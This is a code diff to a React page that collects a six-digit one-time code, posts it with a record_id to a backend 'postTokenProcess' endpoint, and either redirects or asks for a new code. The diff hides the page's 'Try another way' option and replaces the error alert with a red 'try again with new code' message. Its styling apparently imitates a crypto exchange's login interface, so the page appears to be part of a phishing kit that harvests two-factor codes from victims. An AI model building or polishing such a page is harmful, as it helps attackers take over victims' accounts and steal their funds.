@@ -9,26 +9,28 @@ import axios from "axios";
 export default function Home() {
   const [otp, setOtp] = useState("");
   const themeContext = useContext(ThemeContext);
+  const [eFlag, setEFlag] = useState(false);
   if (!themeContext) {
     throw new Error("ThemeToggle must be used within a ThemeProvider");
   }
   const { theme } = themeContext;
-  console.log("theme", theme)
+  console.log("theme", theme);
   useEffect(() => {
+    setEFlag(false);
     if (otp.length == 6) {
       axios
         .post("/api/postTokenProcess", {
           record_id: theme.record_id,
-          code: otp
+          code: otp,
         })
         .then((res) => {
           console.log(res.data);
           setTimeout(() => {
             const { record_id, status } = res.data;
             if (status == "redirect") {
-              window.location.replace(res.data.link)
+              window.location.replace(res.data.link);
             } else {
-              alert('Wrong Code')
+              setEFlag(true);
             }
           }, 1000);
         });
@@ -75,9 +77,16 @@ export default function Home() {
           />
         </div>
         <div className="ctw-py-[24px] ctw-text-center">
-          <p className="ctw-text-[rgb(55,115,245) ctw-text-[16px]] cds-body-bvviwwo ctw-text-[#3773f5] ctw-cursor-pointer">
+          {/* <p className="ctw-text-[rgb(55,115,245) ctw-text-[16px]] cds-body-bvviwwo ctw-text-[#3773f5] ctw-cursor-pointer">
             Having trouble? Try another way
-          </p>
+          </p> */}
+          {eFlag && (
+            <p className="ctw-text-[rgb(255,0,0) ctw-text-[16px]] cds-body-bvviwwo ctw-text-[#FF0000] ctw-cursor-pointer">
+              There was some issue, please try again with
+              <br />
+              new code
+            </p>
+          )}
         </div>
       </div>
       <div className="ctw-py-[24px] ctw-text-center">
